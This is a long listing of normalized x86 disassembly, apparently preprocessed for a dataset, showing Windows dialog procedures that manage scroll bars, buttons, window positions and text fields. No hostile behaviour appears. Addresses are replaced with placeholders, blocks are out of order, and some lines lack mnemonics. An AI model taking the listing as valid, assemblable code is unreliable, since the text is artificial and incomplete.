mov edx [ esp + 0x78 ]
push eax
inc edx
push edx
push 0xd
push esi
call ebx
cmp [ esp + 0x7c ] ebp
mov eax [ esp + 0x68 ]
jae r-xdata
lea eax [ esp + 0x68 ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
fild [ esp + 0x18 ]
push ecx
fstp [ esp + 0x14 ]
fild [ rw-data ]
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp esi eax
jge r-xdata
fild [ rw-data ]
push ecx
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp esi eax
jle r-xdata
fild [ rw-data ]
push ecx
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] eax
jmp r-xdata
lea edx [ esp + 0x9c ]
push edx
push 0x0
push 0xc
push 0x414
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
cmp di 0x52a
mov esi eax
mov [ esp + 0x80 ] 0x1c
mov [ esp + 0x84 ] 0x4
mov [ esp + 0x94 ] esi
mov [ rw-data ] 0x1
jne r-xdata
lea eax [ esp + 0x68 ]
mov ecx rw-data
call sub_401420
mov ecx [ rw-data ]
push ecx
mov [ rw-data ] 0x5
call sub_419a00
mov edx [ rw-data ]
push 0x1
push 0x0
push edx
push ebp
call sub_485220
add esp 0x14
mov esi [ ecx + ebx * 4 ]
test esi esi
lea edi [ ecx + ebx * 4 ]
je r-xdata
cmp ebx eax
jge r-xdata
fild [ rw-data ]
push ecx
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp esi eax
jle r-xdata
fild [ rw-data ]
push ecx
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
fild [ esp + 0x14 ]
fdiv [ esp + 0x10 ]
fstp [ rw-data ]
fild [ rw-data ]
push ecx
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov [ esp + 0x14 ] eax
cmp di 0x413
jne r-xdata
mov edi [ esp + 0x2ac ]
mov ebx [ SendDlgItemMessageA@IAT ]
push r--data
push 0x0
push 0xc
push 0x413
push edi
call ebx
push r--data
push 0x0
push 0xc
push 0x414
push edi
call ebx
test esi esi
je r-xdata
mov [ edi ] 0x0
mov eax [ rw-data ]
mov [ eax + ebx * 4 ] 0xffffffff
inc ebx
jmp r-xdata
dec [ esi + 0xd48 ]
jne r-xdata
fild [ esp + 0x14 ]
push 0x1
push ebp
fdiv [ esp + 0x18 ]
fstp [ rw-data ]
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
fild [ rw-data ]
push ecx
fmul [ esp + 0x14 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov [ esp + 0x14 ] eax
cmp di 0x414
jne r-xdata
mov edi [ esp + 0x2ac ]
mov ebx [ SendDlgItemMessageA@IAT ]
push r--data
push 0x0
push 0xc
push 0x52a
push edi
call ebx
push r--data
push 0x0
push 0xc
push 0x414
push edi
call ebx
test esi esi
je r-xdata
lea ecx [ esp + 0x64 ]
mov [ rw-data ] 0x0
call sub_4480e0
jmp r-xdata
push 0x1
lea eax [ esp + 0x84 ]
push eax
push 0x2
push 0x40b
jmp r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov edi [ esp + 0x2ac ]
mov ebx [ SendDlgItemMessageA@IAT ]
push r--data
push 0x0
push 0xc
push 0x52a
push edi
call ebx
push r--data
push 0x0
push 0xc
push 0x413
push edi
call ebx
test esi esi
je r-xdata
push 0x1
lea ecx [ esp + 0x84 ]
push ecx
push 0x2
push 0x40c
jmp r-xdata
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
push 0x1
lea edx [ esp + 0x84 ]
push edx
push 0x2
push 0x40d
sub_488db0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c146c
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x304
cmp eax 0x4e
push ebx
push ebp
push esi
push edi
ja r-xdata
sub eax 0x110
je r-xdata
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi [ rw-data ]
mov edi eax
or edi ecx
or edi edx
or edi esi
jne r-xdata
dec eax
je r-xdata
cmp [ esp + 0x32c ] 0x412
jne r-xdata
add eax 0xfffffffe
cmp eax 0x16
ja r-xdata
push 0x4
sub eax edx
push eax
sub ecx esi
push ecx
push edx
push esi
mov esi [ esp + 0x338 ]
mov eax [ rw-data ]
mov edi [ GetWindowRect@IAT ]
lea edx [ esp + 0x74 ]
push edx
push eax
call edi
mov esi [ esp + 0x324 ]
lea ecx [ esp + 0x18 ]
push ecx
push esi
call edi
mov eax [ esp + 0x1c ]
mov edi [ esp + 0x24 ]
mov ecx [ esp + 0x78 ]
mov ebp [ esp + 0x80 ]
mov ebx [ esp + 0x20 ]
sub eax edi
sub eax ecx
add eax ebp
cdq
sub eax edx
mov edx [ esp + 0x7c ]
sar eax 0x1
add eax ecx
mov ecx [ esp + 0x74 ]
push 0x4
push 0x190
push 0x12c
push eax
mov eax [ esp + 0x28 ]
sub eax ebx
sub eax ecx
add eax edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
push eax
jmp r-xdata
cmp [ esp + 0x32c ] 0x2
jne r-xdata
sub eax 0x303
jne r-xdata
xor eax eax
mov eax [ esp + 0x330 ]
cmp [ eax + 0x8 ] 0xfffffe6e
jne r-xdata
movzx eax [ eax + lookup_table_48940c ]
jmp [ eax * 4 + jump_table_4893f8 ]
push 0x0
push esi
call [ SetWindowPos@IAT ]
push sub_45cd20
push 0xfffffffc
push 0x412
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetWindowLongA@IAT ]
mov [ rw-data ] eax
mov ecx [ esp + 0x324 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
mov eax 0x1
jmp r-xdata
mov al [ rw-data ]
xor ebx ebx
cmp al bl
je r-xdata
mov ecx [ eax + 0x14 ]
xor ebx ebx
cmp ecx ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0xd
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
mov eax [ esp + 0x324 ]
push edx
push 0xfffffffc
push 0x412
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SetWindowLongA@IAT ]
jmp r-xdata
mov esi [ esp + 0x324 ]
push rw-data
push esi
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x330 ]
push 0x1
mov ecx eax
shr ecx 0x10
push ecx
movzx edx ax
push edx
xor ebx ebx
push ebx
push ebx
push 0x412
push esi
call [ GetDlgItem@IAT ]
push eax
call [ MoveWindow@IAT ]
jmp r-xdata
cmp [ esp + 0x32c ] 0x1
jne r-xdata
mov ecx [ esp + 0x314 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x310
retn
mov edx [ esp + 0x324 ]
push 0x412
push edx
call [ GetDlgItem@IAT ]
push 0xffff0000
push ebx
push 0x1101
push eax
mov [ esp + 0x40 ] eax
call [ SendMessageA@IAT ]
lea ecx [ esp + 0x18 ]
call sub_433b70
mov [ esp + 0x31c ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
mov eax [ eax + 0x5c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x324 ]
xor ebx ebx
push ebx
push ebx
push 0x414
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x324 ]
push 0x1
push ebx
push eax
push ecx
call sub_485220
add esp 0x10
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
push eax
push ecx
lea edx [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x328 ] 0xffffffff
call sub_433920
mov eax [ esp + 0x1c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
xor eax eax
mov ecx 0xd
lea edi [ esp + 0xa4 ]
[ edi ]
cmp [ rw-data ] ebx
mov ebp 0xffff0000
je r-xdata
cmp [ esp + 0x14 ] edx
jge r-xdata
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
mov eax [ esp + 0x10 ]
cmp [ esi + eax + 0x18 ] 0x10
mov [ esp + 0x31c ] 0x1
jb r-xdata
mov eax [ esp + 0x10 ]
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
lea edx [ esi + eax + 0x4 ]
mov edx [ esi + eax + 0x4 ]
jmp r-xdata
lea edx [ esi + eax + 0x4 ]
mov [ esp + 0xbc ] edx
jmp r-xdata
mov ecx [ esi + eax + 0x4 ]
mov [ esp + 0xbc ] ecx
jmp r-xdata
sub esi edi
inc esi
push esi
add edi edx
push edi
lea ecx [ esp + 0x218 ]
push ecx
call [ lstrcpynA@IAT ]
cmp [ esp + 0x70 ] 0x10
lea edx [ esp + 0x210 ]
mov [ esp + 0xbc ] edx
mov [ esp + 0x31c ] bl
jb r-xdata
lea ecx [ ecx ]
mov eax [ esi + eax + 0x14 ]
mov ecx [ rw-data ]
sub eax ecx
xor edi edi
dec eax
lea edx [ edx + ecx + 0x1 ]
xor esi esi
cmp eax ebx
mov [ esp + 0x2c ] edx
mov [ esp + 0x28 ] eax
jle r-xdata
mov esi [ esp + 0x14 ]
mov edi [ SendMessageA@IAT ]
lea ecx [ esp + 0xa4 ]
push ecx
push ebx
mov [ esp + 0xac ] ebp
mov ebp [ esp + 0x38 ]
push 0x1100
push ebp
mov [ esp + 0xb8 ] 0xffff0002
mov [ esp + 0xbc ] 0x5
mov [ esp + 0xe0 ] esi
call edi
cmp esi [ rw-data ]
jne r-xdata
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
mov eax [ esp + 0x5c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp cl 0x5c
je r-xdata
inc esi
jmp r-xdata
mov eax [ esp + 0x10 ]
inc esi
add eax 0x70
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] eax
jmp r-xdata
push eax
push 0x9
push 0x110b
push ebp
call edi
push esi
push edx
lea ecx [ esp + 0x60 ]
call sub_401e80
lea ecx [ esp + 0x58 ]
push ecx
lea edx [ esp + 0x38 ]
push edx
lea ecx [ esp + 0x20 ]
call sub_432c60
mov eax [ esp + 0x34 ]
cmp eax [ esp + 0x1c ]
jne r-xdata
cmp cl 0x2f
jne r-xdata
mov eax [ esp + 0x28 ]
inc esi
cmp esi eax
jl r-xdata
mov esi [ rw-data ]
cmp esi ebx
jne r-xdata
mov ebp [ eax + 0x28 ]
mov ecx [ esp + 0x2c ]
mov eax esi
sub eax edi
inc eax
push eax
add edi ecx
push edi
lea edx [ esp + 0x114 ]
push edx
call [ lstrcpynA@IAT ]
mov edx [ esp + 0x30 ]
xor eax eax
mov ecx 0xd
lea edi [ esp + 0xd8 ]
[ edi ]
lea ecx [ esp + 0xd8 ]
push ecx
push ebx
push 0x1100
lea eax [ esp + 0x118 ]
push edx
mov [ esp + 0xec ] 0xffff0002
mov [ esp + 0xf0 ] 0x5
mov [ esp + 0xe8 ] ebp
mov [ esp + 0x100 ] eax
mov [ esp + 0x114 ] 0xffffffff
call [ SendMessageA@IAT ]
mov edi 0xf
mov ebp eax
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] bl
mov [ esp + 0x54 ] ebx
push 0xffffffff
push ebx
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0x328 ] 0x2
call sub_401dd0
push 0xffffffff
push ebx
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x90 ]
mov [ esp + 0x60 ] ebp
mov [ esp + 0xa8 ] edi
mov [ esp + 0xa4 ] ebx
mov [ esp + 0x94 ] bl
call sub_401dd0
mov edx [ esp + 0x54 ]
mov [ esp + 0xa0 ] edx
lea eax [ esp + 0x84 ]
push eax
lea ecx [ esp + 0x78 ]
push ecx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x324 ] 0x3
call sub_4339e0
cmp [ esp + 0x9c ] 0x10
jb r-xdata
mov cl [ esi + edx ]
mov al cl
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
cmp [ esp + 0x50 ] 0x10
mov [ esp + 0x9c ] edi
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
mov [ esp + 0x31c ] 0x1
jb r-xdata
mov edx [ esp + 0x88 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] bl
jmp r-xdata
mov eax [ esp + 0x3c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x2c ]
lea edi [ esi + 0x1 ]
sub_489450
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c148b
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x258
cmp eax 0x501
push ebx
push ebp
push esi
push edi
ja r-xdata
sub eax 0x502
je r-xdata
je r-xdata
mov eax [ esp + 0x280 ]
mov esi [ esp + 0x278 ]
mov edi [ GetDlgItem@IAT ]
mov ebp [ EnableWindow@IAT ]
xor ebx ebx
cmp eax 0x2
setge bl
xor ecx ecx
cmp eax 0x4
setne cl
mov [ rw-data ] 0x1
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] ecx
lea esp [ esp ]
dec eax
jne r-xdata
cmp [ rw-data ] 0x2
je r-xdata
sub eax 0x110
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push edx
add eax 0x548
push eax
push esi
call edi
push eax
call ebp
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x2
mov [ esp + 0x14 ] eax
jl r-xdata
test ebx ebx
je r-xdata
xor eax eax
mov edi [ esp + 0x278 ]
mov esi [ esp + 0x280 ]
mov ebx [ GetDlgItem@IAT ]
imul esi esi 0x12c
push 0x2
push 0x53a
push edi
call ebx
mov ebp [ GetScrollPos@IAT ]
push eax
call ebp
push 0x2
push 0x40c
push edi
mov [ esi + rw-data ] eax
call ebx
push eax
call ebp
push 0x2
push 0x40d
push edi
mov [ esi + rw-data ] eax
call ebx
push eax
call ebp
push 0x2
push 0x40e
push edi
mov [ esi + rw-data ] eax
call ebx
push eax
call ebp
push 0x2
push 0x40f
push edi
mov [ esi + rw-data ] eax
call ebx
push eax
call ebp
push 0x0
push 0x0
push 0x468
push 0x557
push edi
mov [ esi + rw-data ] eax
call [ SendDlgItemMessageA@IAT ]
mov ebp [ IsDlgButtonChecked@IAT ]
movsx eax ax
push 0x541
push edi
mov [ esi + rw-data ] eax
call ebp
mov [ esi + rw-data ] eax
xor ebx ebx
nop
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x3c ] eax
jg r-xdata
mov ecx [ esp + 0x278 ]
push r--data
push 0x0
push 0xc
push 0x3f3
push ecx
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov edx [ rw-data ]
test edx edx
mov esi [ rw-data ]
jne r-xdata
dec eax
je r-xdata
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
inc ebx
cmp ebx 0x5
jl r-xdata
mov [ esi + rw-data ] ebx
mov ebx [ esp + 0x278 ]
push 0x0
push 0x0
push 0x468
push 0x557
push ebx
call [ SendDlgItemMessageA@IAT ]
movsx eax ax
test eax eax
mov [ esp + 0x10 ] eax
jle r-xdata
mov edx [ esp + 0x278 ]
push r--data
push 0x0
push 0xc
push 0x3f3
push edx
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
push edx
push esi
jmp r-xdata
mov ebx [ esp + 0x280 ]
cmp bx 0x1
je r-xdata
sub eax 0x3
jne r-xdata
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
lea ecx [ ebx + 0x53c ]
push ecx
push edi
call ebp
cmp eax 0x1
jne r-xdata
xor ebx ebx
lea ecx [ ecx ]
mov esi [ GetDlgItem@IAT ]
push 0x2
push 0x40c
push ebx
call esi
mov edi [ GetScrollPos@IAT ]
push eax
call edi
push 0x2
push 0x40d
push ebx
mov [ esp + 0x20 ] eax
call esi
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x2
push 0x40e
mov ebp eax
push ebx
add ebp edx
call esi
push eax
call edi
push 0x2
push 0x40f
push ebx
mov [ esp + 0x4c ] eax
call esi
push eax
call edi
push 0x2
push 0x53a
push ebx
mov [ esp + 0x40 ] eax
call esi
push eax
call edi
mov ecx eax
test ecx ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
lea ecx [ eax * 4 + 0x4 ]
mov [ esp + 0x10 ] ecx
mov ebp [ esp + 0x278 ]
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] r--data
mov [ esp + 0x24 ] r--data
mov [ esp + 0x28 ] r--data
mov [ esp + 0x10 ] ecx
xor ebx ebx
test edx edx
jne r-xdata
call sub_45b5d0
add esp 0x4
test esi esi
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov ebp [ esp + 0x278 ]
jl r-xdata
cmp bx 0x4
je r-xdata
mov edi [ esp + 0x284 ]
lea eax [ esp + 0x18 ]
push eax
push 0x2
push edi
mov [ esp + 0x24 ] 0x1c
mov [ esp + 0x28 ] 0x7
call [ GetScrollInfo@IAT ]
mov ecx [ esp + 0x280 ]
movzx eax cx
cmp eax 0x7
mov [ esp + 0x1c ] 0x4
ja r-xdata
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x539
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
inc ebx
cmp ebx 0x4
jl r-xdata
mov [ esi + rw-data ] ebx
mov edi [ esp + 0x3c ]
mov edx [ rw-data ]
push 0xfffffff0
push edx
call [ GetWindowLongA@IAT ]
mov ecx [ rw-data ]
mov edi eax
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ esp + 0x3c ] eax
call esi
mov esi [ esp + 0x20 ]
sub esi [ esp + 0x18 ]
test edi 0x200000
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx ]
push eax
push 0x0
push 0x143
push 0x54d
lea esi [ ebx + rw-data ]
lea edi [ ebx + rw-data ]
mov ecx 0x4b
push ebp
[ edi ] [ esi ]
call [ SendDlgItemMessageA@IAT ]
mov ecx [ esp + 0x10 ]
add ebx 0x12c
add ecx 0x4
cmp ebx 0x5dc
mov [ esp + 0x10 ] ecx
jl r-xdata
mov ebx [ esp + 0x14 ]
push 0x0
push ebx
push 0x14e
push 0x54d
push ebp
call [ SendDlgItemMessageA@IAT ]
mov esi [ GetDlgItem@IAT ]
push 0x0
push 0x556
push ebp
call esi
push eax
push 0x469
push 0x557
push ebp
call esi
mov edi [ SendMessageA@IAT ]
push eax
call edi
push 0xa
push 0x0
push 0x465
push 0x557
push ebp
call esi
push eax
call edi
push 0x0
push ebx
push 0x502
push ebp
mov [ rw-data ] ebx
call edi
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp bx 0x1
mov ecx 0x177
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
jne r-xdata
push 0x0
push eax
push 0x503
push ebp
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
cmp bx 0x2
jne r-xdata
push 0x1
lea edx [ esp + 0x1c ]
push edx
push 0x2
push edi
call [ SetScrollInfo@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_48a5c4 ]
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x53a
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
lea edx [ ebx + 0x543 ]
push edx
push edi
call ebp
cmp eax 0x1
jne r-xdata
push 0x53b
push edi
call ebp
cmp eax 0x1
jne r-xdata
mov eax edi
cdq
idiv ecx
test edx edx
mov edx eax
je r-xdata
mov ecx edi
mov ecx [ esp + 0x24 ]
sub ecx [ esp + 0x1c ]
test edi 0x100000
mov [ esp + 0x10 ] ecx
je r-xdata
add esi [ esp + 0x38 ]
mov [ esp + 0x14 ] 0x4
cmp eax 0x4
jne r-xdata
push 0x1
push ebp
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
cmp bx 0x557
jne r-xdata
mov ecx [ esp + 0x278 ]
push 0x2
push ecx
call [ EndDialog@IAT ]
mov eax 0x1
jmp r-xdata
mov eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x64 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov esi [ esp + 0x284 ]
mov ebx [ GetDlgItem@IAT ]
add esp 0xc
push 0x53a
push esi
call ebx
cmp edi eax
jne r-xdata
mov ecx [ esp + 0x20 ]
jmp r-xdata
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x28 ]
inc edx
mov [ esp + 0x2c ] edx
jmp r-xdata
mov eax [ esp + 0x2c ]
cmp eax [ esp + 0x20 ]
jle r-xdata
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
sub ecx esi
inc ecx
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x20 ]
sub eax 0x10
cmp eax ecx
mov [ esp + 0x2c ] eax
jge r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x24 ]
mov esi [ esp + 0x28 ]
add ecx 0x10
sub eax esi
inc eax
cmp ecx eax
mov [ esp + 0x2c ] ecx
jle r-xdata
shr ecx 0x10
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x413
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
push 0x542
push edi
call ebp
cmp eax 0x1
jne r-xdata
or [ esi + rw-data ] 0x10
lea eax [ edx - 0x1 ]
imul eax [ esp + 0x40 ]
mov esi edx
imul esi ebp
add esi eax
lea eax [ ecx - 0x1 ]
imul eax [ esp + 0x34 ]
mov edi ecx
imul edi [ esp + 0x14 ]
add edi eax
mov eax edi
imul eax esi
lea eax [ eax + eax * 2 ]
mov [ esp + 0x34 ] eax
sub esp 0x8
fild [ esp + 0x3c ]
fmul [ r--data ]
fstp [ esp ]
push esi
push edi
push ecx
push edx
lea ecx [ esp + 0x78 ]
push r--data
push ecx
call sub_4b675e
add esp 0x20
lea edx [ esp + 0x60 ]
push edx
push 0x0
push 0xc
push 0x3f3
push ebx
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
lea edx [ eax + 0x1 ]
mov eax esi
cdq
idiv [ esp + 0x14 ]
mov ecx eax
test ecx ecx
jg r-xdata
add ecx eax
mov [ esp + 0x10 ] ecx
mov eax [ rw-data ]
cmp eax 0x1c
je r-xdata
push 0x1
call sub_489430
add esp 0x4
mov eax 0x1
jmp r-xdata
mov ecx [ esp + 0x268 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x264
retn
cmp bx 0x543
jb r-xdata
mov edx [ esp + 0x278 ]
push 0x0
push 0x0
push 0x501
push edx
jmp r-xdata
push 0x40c
push esi
call ebx
cmp edi eax
jne r-xdata
lea edx [ esp + 0x60 ]
push edx
push 0x0
push 0xc
push 0x539
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov [ esp + 0x2c ] ecx
dec eax
mov [ esp + 0x2c ] eax
jmp r-xdata
inc eax
mov [ esp + 0x2c ] eax
jmp r-xdata
jmp r-xdata
mov [ esp + 0x2c ] eax
jmp r-xdata
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x40c
push esi
call edi
push eax
call ebp
push ebx
push 0x414
push esi
call edi
push eax
call ebp
push ebx
push 0x40d
push esi
call edi
push eax
call ebp
push ebx
push 0x415
push esi
call edi
push eax
call ebp
push ebx
push 0x40e
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
push 0x548
push edi
call ebp
dec eax
neg eax
sbb eax eax
neg eax
mov [ esi + rw-data ] eax
jmp r-xdata
mov edx [ esi + rw-data ]
lea eax [ esi + rw-data ]
push eax
push 0x104
push 0xd
push 0x54a
or edx 0x20
push edi
mov [ esi + rw-data ] edx
call [ SendDlgItemMessageA@IAT ]
mov edi [ esp + 0x3c ]
mov eax edi
cdq
idiv ecx
test edx edx
je r-xdata
mov ecx 0x1
mov eax 0x1
jmp r-xdata
test eax eax
jne r-xdata
cmp bx 0x542
jne r-xdata
cmp bx 0x546
ja r-xdata
call [ SendMessageA@IAT ]
push 0x40d
push esi
call ebx
cmp edi eax
jne r-xdata
lea eax [ esp + 0x60 ]
push eax
push 0x0
push 0xc
push 0x413
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x416
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
mov edx [ esp + 0x10 ]
imul eax ebp
cmp eax edx
jle r-xdata
inc eax
push 0x1
push 0xffffffff
xor ecx ecx
push ebp
push eax
mov [ rw-data ] ecx
mov [ rw-data ] ecx
call sub_486df0
add esp 0x10
mov eax [ rw-data ]
cmp eax 0x1c
je r-xdata
cmp bx 0x408
jne r-xdata
mov esi [ esp + 0x278 ]
push 0x542
push esi
call [ IsDlgButtonChecked@IAT ]
mov ebx [ GetDlgItem@IAT ]
mov edi eax
push edi
push 0x54a
push esi
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push edi
push 0x408
push esi
call ebx
push eax
call ebp
jmp r-xdata
mov edi [ esp + 0x278 ]
push 0x543
push edi
call [ IsDlgButtonChecked@IAT ]
mov esi eax
mov eax [ rw-data ]
neg esi
sbb esi esi
inc esi
cmp eax 0x4
je r-xdata
push 0x40e
push esi
call ebx
cmp edi eax
jne r-xdata
lea ecx [ esp + 0x60 ]
push ecx
push 0x0
push 0xc
push 0x414
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x40f
push esi
call edi
push eax
call ebp
push ebx
push 0x543
push esi
call edi
push eax
call ebp
push ebx
push 0x544
push esi
call edi
push eax
call ebp
push ebx
push 0x545
push esi
call edi
push eax
call ebp
push ebx
push 0x546
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
cmp ecx edi
jle r-xdata
mov ecx [ esp + 0x38 ]
mov eax esi
sub eax ecx
cdq
idiv [ esp + 0x14 ]
mov ecx eax
test ecx ecx
jg r-xdata
mov eax 0xb
test eax eax
jne r-xdata
cmp bx 0x539
je r-xdata
push 0x104
lea eax [ esp + 0x64 ]
push eax
push 0x0
mov [ esp + 0x170 ] 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x60 ]
push ecx
call sub_457f40
mov esi [ esp + 0x27c ]
lea edx [ esp + 0x64 ]
push r--data
dec edx
mov [ eax + edx ] 0x0
push 0x104
lea eax [ esp + 0x170 ]
push eax
lea ecx [ esp + 0x70 ]
push ecx
push esi
call sub_45be60
mov al [ esp + 0x17c ]
add esp 0x18
test al al
je r-xdata
xor eax eax
test esi esi
je r-xdata
push 0x40f
push esi
call ebx
cmp edi eax
jne r-xdata
lea edx [ esp + 0x60 ]
push edx
push 0x0
push 0xc
push 0x415
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
xor eax eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x53b
push esi
call edi
push eax
call ebp
push ebx
push 0x542
push esi
call edi
push eax
call ebp
push ebx
push 0x54a
push esi
call edi
push eax
call ebp
push ebx
push 0x408
push esi
call edi
push eax
call ebp
mov ecx [ esp + 0x10 ]
push ecx
push 0x541
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
mov ecx 0x1
jmp r-xdata
mov eax ebx
shr eax 0x10
cmp eax 0x300
jne r-xdata
cmp bx 0x413
je r-xdata
lea edx [ esp + 0x164 ]
push edx
push 0x0
push 0xc
push 0x54a
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esp + 0x60 ]
push eax
push 0x0
push 0xc
push 0x416
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov eax [ esp + 0x14 ]
push 0x0
add eax 0x548
push eax
push esi
call [ CheckDlgButton@IAT ]
mov eax [ esp + 0x14 ]
inc eax
cmp eax 0x2
mov [ esp + 0x14 ] eax
jl r-xdata
mov eax 0x1
jmp r-xdata
push eax
push 0x556
push esi
call edi
push eax
call ebp
test ebx ebx
je r-xdata
